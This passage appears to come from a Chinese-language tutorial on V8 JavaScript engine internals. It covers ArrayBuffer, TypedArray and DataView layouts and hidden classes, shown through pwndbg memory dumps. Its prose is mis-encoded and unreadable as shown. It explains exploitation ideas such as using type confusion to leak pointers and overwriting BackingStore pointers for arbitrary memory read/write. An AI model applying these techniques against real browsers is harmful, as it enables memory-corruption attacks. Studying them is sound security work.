&#125;</span><br><span class="line">pwndbg&gt; job <span class="number">0x3aaf2dc1f2f9</span></span><br><span class="line"><span class="number">1.1</span></span><br><span class="line">pwndbg&gt; x/<span class="number">2</span>gx <span class="number">0x3aaf2dc1f2f9</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x3aaf2dc1f2f8</span>:<span class="number">0x000004fddb340561</span><span class="number">0x3ff199999999999a</span></span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œ1.1å°±å˜æˆç”¨HeapNumberäº†</p><p>ğŸ’¡å¯ä»¥çœ‹å‡ºdouble arrayå’Œobject arrayçš„å­˜å‚¨æ–¹å¼ä¸åŒï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§ï¼Œå‡è®¾æœ‰ä¸€ä¸ªdouble arrayå’Œobject arrayçš„ç±»å‹æ··æ·†ï¼Œä½¿å¾—object arrayä½¿ç”¨double arrayçš„æ–¹å¼ç›´æ¥æŠŠå…ƒç´ è¯»å‡ºæ¥ï¼Œè¿™æ ·å¯ä»¥leakä»»æ„æŒ‡é’ˆçš„åœ°å€&#x2F;ä¼ªé€ ä»»æ„object</p></blockquote><h3 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h3><p>ä¿å­˜æœ‰â¼€ä¸ªè¢«ç§°ä½œBackingStoreçš„bufferçš„å¯¹è±¡</p><blockquote><p>BackingStore æ˜¯ä¸€ç§ç”¨äºå­˜å‚¨æ•°æ®çš„ç‹¬ç«‹å†…å­˜åŒºåŸŸï¼Œä¸»è¦ç”¨äºå­˜æ”¾ JavaScript ä¸­ <code>TypedArray</code>ã€<code>ArrayBuffer</code> è¿™æ ·çš„äºŒè¿›åˆ¶æ•°æ®ã€‚</p><ul><li><strong>ä¸å— GC ç®¡ç†</strong>ï¼šè¿™å—å†…å­˜åŒºåŸŸæ˜¯ç‹¬ç«‹åˆ†é…çš„ï¼Œä¸ä¼šè¢« V8 çš„ GC è‡ªåŠ¨å›æ”¶,å› æ­¤å‘BackingStoreçš„æŒ‡é’ˆä¸æ˜¯Tagged Valueï¼ˆæœ«å°¾ä¸èƒ½ä¸º1ï¼‰</li><li>åˆ†é…æ–¹å¼ï¼š<ul><li>åœ¨ Chrome ä¸­ä½¿ç”¨ <strong>PartitionAlloc</strong> åˆ†é…ã€‚</li><li>åœ¨ d8ï¼ˆV8 çš„ç‹¬ç«‹è¿è¡Œç¯å¢ƒï¼‰ä¸­ä½¿ç”¨ <strong>ptmalloc</strong>ï¼ˆä¸€ä¸ªå¸¸è§çš„ malloc å®ç°ï¼‰æ¨¡æ‹Ÿåˆ†é…ã€‚</li></ul></li><li><strong>ç”¨é€”</strong>ï¼šå®ƒæ˜¯ä¸€ç§é«˜æ•ˆå­˜å‚¨äºŒè¿›åˆ¶æ•°æ®çš„æ–¹æ³•ï¼Œé¿å…äº†ä¸ GC äº¤äº’æ—¶çš„é¢å¤–å¼€é”€ã€‚</li></ul></blockquote><p>ä¸¾ä¸ªä¾‹å­ğŸŒ°</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line">%<span class="built_in">DebugPrint</span>(buf);</span><br><span class="line">%<span class="built_in">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x3d9ab9b8dd79</span> &lt;ArrayBuffer map = <span class="number">0x2027fb1021b9</span>&gt;</span><br><span class="line">pwndbg&gt; job <span class="number">0x3d9ab9b8dd79</span></span><br><span class="line"><span class="number">0x3d9ab9b8dd79</span>: [JSArrayBuffer]</span><br><span class="line"> - map: <span class="number">0x2027fb1021b9</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x28593e5ce981</span> &lt;Object map = <span class="number">0x2027fb102209</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x15b6957c0c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - embedder fields: <span class="number">2</span></span><br><span class="line"> - backing_store: <span class="number">0x559b9dc779f0</span> <span class="comment">//* ä¸æ˜¯tagged value</span></span><br><span class="line"> - byte_length: <span class="number">32</span></span><br><span class="line"> - detachable</span><br><span class="line"> - properties: <span class="number">0x15b6957c0c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;&#125;</span><br><span class="line"> - embedder fields = &#123;</span><br><span class="line">    <span class="number">0</span>, aligned pointer: (nil)</span><br><span class="line">    <span class="number">0</span>, aligned pointer: (nil)</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x559b9dc779f0</span></span><br><span class="line"><span class="number">0x559b9dc779f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x559b9dc77a00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x559b9dc77a10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x559b9dc77a20</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000559b9dbef010</span></span><br><span class="line"><span class="number">0x559b9dc77a30</span>:<span class="number">0x3031626637323032</span><span class="number">0x0000003e39303232</span></span><br><span class="line"><span class="number">0x559b9dc77a40</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000003c1</span></span><br><span class="line"><span class="number">0x559b9dc77a50</span>:<span class="number">0x00007f8ec2273be0</span><span class="number">0x00007f8ec2273be0</span></span><br><span class="line"><span class="number">0x559b9dc77a60</span>:<span class="number">0x0000559b694a8081</span><span class="number">0x0000000100440000</span></span><br><span class="line"><span class="number">0x559b9dc77a70</span>:<span class="number">0x0072005000000008</span><span class="number">0x0000559b9dc77a30</span></span><br><span class="line"><span class="number">0x559b9dc77a80</span>:<span class="number">0x0000559b9dc83e80</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x559b9dc779f0</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x559b9dc779e0</span>:<span class="number">0x0000082856788f19</span><span class="number">0x0000000000000031</span>  (metaå¤´)</span><br><span class="line"><span class="number">0x559b9dc779f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x559b9dc77a00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x559b9dc77a10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x559b9dc77a20</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000559b9dbef010</span></span><br><span class="line"><span class="number">0x559b9dc77a30</span>:<span class="number">0x3031626637323032</span><span class="number">0x0000003e39303232</span></span><br><span class="line"><span class="number">0x559b9dc77a40</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000003c1</span></span><br><span class="line"><span class="number">0x559b9dc77a50</span>:<span class="number">0x00007f8ec2273be0</span><span class="number">0x00007f8ec2273be0</span></span><br><span class="line"><span class="number">0x559b9dc77a60</span>:<span class="number">0x0000559b694a8081</span><span class="number">0x0000000100440000</span></span><br><span class="line"><span class="number">0x559b9dc77a70</span>:<span class="number">0x0072005000000008</span><span class="number">0x0000559b9dc77a30</span></span><br></pre></td></tr></table></figure></div><blockquote><p>å¸¦metaå¤´ï¼Œå¯è§æ˜¯ptmallocåˆ†é…å‡ºæ¥çš„</p><ul><li><strong>è™½ç„¶åœ¨</strong>ArrayBufferä¸­æè¿°äº†â¼¤â¼©ï¼Œä½†å¦‚æœå°†æ­¤å€¼é‡å†™ä¸ºè¾ƒâ¼¤çš„å€¼ï¼Œå°±å¯ä»¥è¶Šç•Œè¯»å†™äº†ã€‚</li><li>åŒæ ·ï¼Œå¯ä»¥<strong>é‡å†™</strong>BackingStoreæŒ‡é’ˆï¼Œåˆ™å¯ä»¥è¯»å–å’Œå†™â¼Šä»»æ„å†…å­˜åœ°å€</li></ul><p>JSArrayBufferç»“æ„å¦‚ä¸‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[&quot;Pointer (63 bit) | 1&quot;] --&gt; B[JSArrayBuffer]</span><br><span class="line">    B --&gt; C[Map*]</span><br><span class="line">    B --&gt; D[Properties*]</span><br><span class="line">    B --&gt; E[Elements*]</span><br><span class="line">    B --&gt; F[ByteLength]</span><br><span class="line">    B --&gt; G[BackingStore*]</span><br><span class="line">    B --&gt; H[BitField]</span><br><span class="line">    G[BackingStore*] --&gt;I1[BackingStore]</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="JSTypedArray"><a href="#JSTypedArray" class="headerlink" title="JSTypedArray"></a>JSTypedArray</h3><p>JSArrayBufferåªæ˜¯ä¸ªbufferï¼Œåœ¨jsçš„è®¾è®¡â¾¥ï¼Œå¯¹<code>BackStore</code>çš„è¯»å†™éœ€è¦ä¾èµ–äº<code>TypedArray</code>æˆ–è€…<code>DataView</code></p><p>ç»“æ„å¦‚ä¸‹</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[&quot;Pointer (63 bit) | 1&quot;] --&gt;B1[JSTypedArray]</span><br><span class="line">    B1[JSTypedArray]--&gt;B2[Map*]</span><br><span class="line">    B1[JSTypedArray]--&gt;B3[Properties*]</span><br><span class="line">    B1[JSTypedArray]--&gt;B4[Elements*]</span><br><span class="line">     B1[JSTypedArray]--&gt;B5[Buffer*]</span><br><span class="line">     B1[JSTypedArray]--&gt;B6[BufferOffset]</span><br><span class="line">       B1[JSTypedArray]--&gt;B7[ByteLength]</span><br><span class="line">      B1[JSTypedArray]--&gt;B8[Length]</span><br><span class="line">      B1[JSTypedArray]--&gt;B9[ExternalPointer*]</span><br><span class="line">      B1[JSTypedArray]--&gt;B10[BasePointer*]</span><br><span class="line">    B5[Buffer*]--&gt; B[JSArrayBuffer]</span><br><span class="line">    B --&gt; C[Map*]</span><br><span class="line">    B --&gt; D[Properties*]</span><br><span class="line">    B --&gt; E[Elements*]</span><br><span class="line">    B --&gt; F[ByteLength]</span><br><span class="line">    B --&gt; G[BackingStore*]</span><br><span class="line">    B --&gt; H[BitField]</span><br><span class="line">    G[BackingStore*] --&gt;I1[BackingStore]</span><br></pre></td></tr></table></figure></div><blockquote><p><code>JSTypedArray</code>åœ¨æ¼æ´åˆ©â½¤ä¸­çš„â¼€ç§å¸¸â»…â½¤é€”ï¼Œç”±äºä¸¤ä¸ªä¸åŒçš„<code>TypedArray</code>å¯ä»¥å…±äº«åŒæ ·çš„<code>ArrayBuffer</code>ï¼Œæ‰€ä»¥å®é™…ä¸Šå¦‚æœæˆ‘ä»¬â½¤â¼€ä¸ª<code>Float64Array</code>å»å‘<code>ArrayBuffer</code>â¾¥å†™â¼Šâ¼€ä¸ªdoubleå€¼ï¼ˆ8å­—èŠ‚ï¼‰ï¼Œç„¶åâ½¤<code>Uint32Array</code>è¯»å–å‡ºæ¥ï¼Œå°±å¯ä»¥è¯»å‡ºä¸¤ä¸ª4å­—èŠ‚çš„unsigned integerï¼Œå¹¶æ‹¼å‡‘æˆ8å­—èŠ‚çš„unsigned integerï¼Œè¿™æ ·å°±å®ç°äº†doubleåˆ°æ•´å½¢çš„è½¬æ¢ï¼›åŒç†ï¼Œå¯ä»¥åè¿‡æ¥è¿™æ ·å°†â¼€ä¸ªæ•´å½¢è½¬æ¢ä¸ºdouble</p><p>ğŸ’¡ç”±äºjså¯¹æµ®ç‚¹æ•°çš„ç²¾åº¦é—®é¢˜ï¼Œå¯¹äºâ¼¤äº 2^53-1 çš„æ•°æ®ï¼Œè¿™æ ·è½¬æ¢å¯èƒ½ä¼šé€ æˆç»†å¾®çš„åå·®</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> f64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">const</span> u32 = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buf);</span><br><span class="line"><span class="comment">//f64å’Œu32å…±äº«åŒä¸€ä¸ªArrayBuffer</span></span><br><span class="line"><span class="comment">// Floating point to 64-bit unsigned integer</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">val</span>) &#123;</span><br><span class="line">  f64[<span class="number">0</span>] = val;</span><br><span class="line">  <span class="keyword">let</span> tmp = <span class="title class_">Array</span>.<span class="title function_">from</span>(u32);</span><br><span class="line">  <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>]; <span class="comment">//&lt;&lt;4</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64-bit unsigned integer to Floating point</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">val</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> tmp = [];</span><br><span class="line">  tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">  tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>); </span><br><span class="line">  u32.<span class="title function_">set</span>(tmp);</span><br><span class="line">  <span class="keyword">return</span> f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">8</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">d2u</span>(<span class="number">1.1</span>)));</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">u2d</span>(<span class="number">0x3ff199999999999a</span>));</span><br><span class="line">----&gt;</span><br><span class="line"><span class="number">0x3ff1999999999a00</span></span><br><span class="line"><span class="number">1.1000000000000227</span></span><br></pre></td></tr></table></figure></div></blockquote><h3 id="JSDataView"><a href="#JSDataView" class="headerlink" title="JSDataView"></a>JSDataView</h3><p>ä¹Ÿæ˜¯â½¤æ¥è¯»å†™ArrayBufferçš„BackingStoreçš„å†…å®¹çš„å¯¹è±¡ï¼Œå¸¸â½¤äºæœ€åçš„ä»»æ„åœ°å€è¯»å†™åŸè¯­çš„æ„é€ </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[&quot;Pointer (63 bit) | 1&quot;] --&gt;B1[JSDataView]</span><br><span class="line">    B1--&gt;B2[Map*]</span><br><span class="line">    B1--&gt;B3[Properties*]</span><br><span class="line">    B1--&gt;B4[Elements*]</span><br><span class="line">     B1--&gt;B5[Buffer*]</span><br><span class="line">     B1--&gt;B6[BufferOffset]</span><br><span class="line">       B1--&gt;B7[ByteLength]</span><br><span class="line">      B1--&gt;B10[DataPointer*]</span><br><span class="line">    B5[Buffer*]--&gt; B[JSArrayBuffer]</span><br><span class="line">    B --&gt; C[Map*]</span><br><span class="line">    B --&gt; D[Properties*]</span><br><span class="line">    B --&gt; E[Elements*]</span><br><span class="line">    B --&gt; F[ByteLength]</span><br><span class="line">    B --&gt; G[BackingStore*]</span><br><span class="line">    B --&gt; H[BitField]</span><br><span class="line">    G[BackingStore*] --&gt;I1[BackingStore]</span><br></pre></td></tr></table></figure></div><h2 id="0x04-V8ç‰¹æ€§"><a href="#0x04-V8ç‰¹æ€§" class="headerlink" title="0x04 V8ç‰¹æ€§"></a>0x04 V8ç‰¹æ€§</h2><h3 id="Hidden-Class"><a href="#Hidden-Class" class="headerlink" title="Hidden Class"></a>Hidden Class</h3><p>ä»ä¸€ä¸ªæœ€ç®€å•çš„å¯¹è±¡å¼€å§‹åˆ†æ</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">a</span>: <span class="string">&quot;foo&quot;</span>, <span class="attr">b</span>: <span class="string">&quot;bar&quot;</span>&#125;;</span><br></pre></td></tr></table></figure></div><ul><li>aå’Œbå«å‘½åå±æ€§(name propertiesï¼Œåé¢ç®€ç§°ä¸ºproperty)ï¼Œæ²¡æœ‰ä»»ä½•æ•´æ•°ç´¢å¼•<ul><li>æ•´æ•°ç´¢å¼•ï¼Œæ•°ç»„ <code>[&quot;foo&quot;,&quot;bar&quot;]</code>æœ‰ä¸¤ä¸ªæ•´æ•°ç´¢å¼•å±æ€§ï¼š0ï¼Œå€¼ä¸ºâ€œfooâ€ï¼Œ1ï¼Œå€¼ä¸ºâ€œbarâ€ã€‚æ•´æ•°ç´¢å¼•å±æ€§ä¹Ÿå«å…ƒç´ element</li></ul></li></ul><p>åœ¨JS Objectçš„ç»“æ„ä¸­ï¼Œelementå’Œpropertyå­˜å‚¨åœ¨ä¸¤ä¸ªç‹¬â½´çš„FixedArrayä¸­</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241115181225550.png"                      alt="image-20241115181225550"                ><figcaption>image-20241115181225550</figcaption></figure></p><blockquote><p>elementsçš„keyå°±æ˜¯åœ¨Objectçš„å±æ€§æ•°ç»„ä¸­çš„å¯¹åº”ä½ç½®çš„ç´¢å¼•</p><p>è€Œpropertyçš„keyé€šå¸¸æ˜¯å­—ç¬¦ä¸²ï¼Œæ— æ³•ç®€å•åœ°é€šè¿‡keyæ¥åˆ¤æ–­æŸä¸ªpropertyåœ¨å±æ€§æ•°ç»„ä¸­çš„å¯¹åº”ä½ç½®</p><p>ğŸ’¡Tipsï¼šåœ¨jsä¸­ï¼Œä»¥ä¸‹ä¸¤ä¸ªobjçš„å±æ€§æ•°ç»„ä¸åŒï¼Œå³å±æ€§ç»“æ„ä¸åŒ</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1= &#123;<span class="attr">a</span>: <span class="string">&quot;foo&quot;</span>, <span class="attr">b</span>: <span class="string">&quot;bar&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> obj2= &#123;<span class="attr">b</span>: <span class="string">&quot;bar&quot;</span>, <span class="attr">a</span>: <span class="string">&quot;foo&quot;</span>&#125;;</span><br></pre></td></tr></table></figure></div></blockquote><p>ğŸ¤”é‚£ä¹ˆæ€ä¹ˆè§£å†³propertyä½ç½®çš„é—®é¢˜ï¼ŸV8ä¸­ä½¿ç”¨<code>Hidden Class</code>æ¥æè¿°ï¼Œæ¯ä¸ªjs Objectéƒ½æœ‰å…³è”çš„<code>Hidden Class</code>ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰ç”»çš„HeapObjectç»“æ„ä¸­æ’ç¬¬ä¸€ä¸ªçš„<code>Map*</code></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/image-20241115181237410.png"                      alt="image-20241115181237410"                ><figcaption>image-20241115181237410</figcaption></figure></p><p>HiddenClassesçš„åŸºæœ¬å‡è®¾ï¼šå…·æœ‰ç›¸åŒå±æ€§ç»“æ„çš„å¯¹è±¡å…±äº«åŒä¸€ä¸ªHiddenClass</p><p>ä¸¾ä¸ªä¾‹å­ğŸŒ°</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo&quot;</span>,<span class="attr">b</span>:<span class="string">&quot;bar&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo1&quot;</span>,<span class="attr">b</span>:<span class="string">&quot;bar2&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x296e53ccdda1</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x14378b9cab89</span>&gt;</span><br><span class="line"><span class="number">0x296e53ccde41</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x14378b9cab89</span>&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ä»¥çœ‹åˆ°mapæ˜¯ç›¸åŒçš„</p></blockquote><p>å†çœ‹ä¸€ä¸‹è¿ç»­æ·»åŠ å±æ€§çš„è¿‡ç¨‹ä¸­mapçš„å˜åŒ–</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="string">&quot;foo1&quot;</span>&#125;;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line">o1.<span class="property">b</span> = <span class="string">&quot;bar&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">o2.<span class="property">d</span> = <span class="string">&quot;bar2&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line">o1.<span class="property">c</span> = <span class="string">&quot;baz&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o1);</span><br><span class="line">o2.<span class="property">c</span> = <span class="string">&quot;baz2&quot;</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o2);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="comment">//output</span></span><br><span class="line"><span class="number">0x2d3b7204de11</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x218575f4ab39</span>&gt;</span><br><span class="line"><span class="number">0x2d3b7204de61</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x218575f4ab39</span>&gt;</span><br><span class="line"><span class="number">0x2d3b7204de11</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x218575f4ab89</span>&gt;</span><br><span class="line"><span class="number">0x2d3b7204de61</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x218575f4abd9</span>&gt;</span><br><span class="line"><span class="number">0x2d3b7204de11</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x218575f4ac29</span>&gt;</span><br><span class="line"><span class="number">0x2d3b7204de61</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x218575f4ac79</span>&gt;</span><br><span class="line">  </span><br><span class="line">pwndbg&gt; job <span class="number">0x218575f4ab39</span> <span class="comment">//çœ‹çœ‹HC1</span></span><br><span class="line"><span class="number">0x218575f4ab39</span>: [<span class="title class_">Map</span>]</span><br><span class="line"> - <span class="attr">type</span>: <span class="variable constant_">JS_OBJECT_TYPE</span></span><br><span class="line"> - instance <span class="attr">size</span>: <span class="number">32</span></span><br><span class="line"> - inobject <span class="attr">properties</span>: <span class="number">1</span></span><br><span class="line"> - elements <span class="attr">kind</span>: <span class="variable constant_">HOLEY_ELEMENTS</span></span><br><span class="line"> - unused property <span class="attr">fields</span>: <span class="number">0</span></span><br><span class="line"> - enum <span class="attr">length</span>: invalid</span><br><span class="line"> - back <span class="attr">pointer</span>: <span class="number">0x218575f4aae9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt;</span><br><span class="line"> - prototype_validity <span class="attr">cell</span>: <span class="number">0x2379e4b40609</span> &lt;<span class="title class_">Cell</span> value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors #<span class="number">1</span>: <span class="number">0x2d3b7204df61</span> &lt;<span class="title class_">DescriptorArray</span>[<span class="number">3</span>]&gt;</span><br><span class="line"> - layout <span class="attr">descriptor</span>: (nil)</span><br><span class="line"> - transitions #<span class="number">2</span>: <span class="number">0x39b2971dfa91</span> &lt;<span class="title class_">TransitionArray</span>[<span class="number">6</span>]&gt;<span class="title class_">Transition</span> array #<span class="number">2</span>: <span class="comment">//v8ç»´æŠ¤çš„transition tree</span></span><br><span class="line">     #<span class="attr">b</span>: (transition <span class="title function_">to</span> (<span class="keyword">const</span> data field, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>]) @ <span class="title class_">Any</span>) -&gt; <span class="number">0x218575f4ab89</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; <span class="comment">//å±æ€§ä¸ºa,bçš„map</span></span><br><span class="line">     #<span class="attr">d</span>: (transition <span class="title function_">to</span> (<span class="keyword">const</span> data field, <span class="attr">attrs</span>: [<span class="variable constant_">WEC</span>]) @ <span class="title class_">Any</span>) -&gt; <span class="number">0x218575f4abd9</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; <span class="comment">//å±æ€§ä¸ºa,dçš„map</span></span><br><span class="line"></span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x39b2971c2091</span> &lt;<span class="title class_">Object</span> map = <span 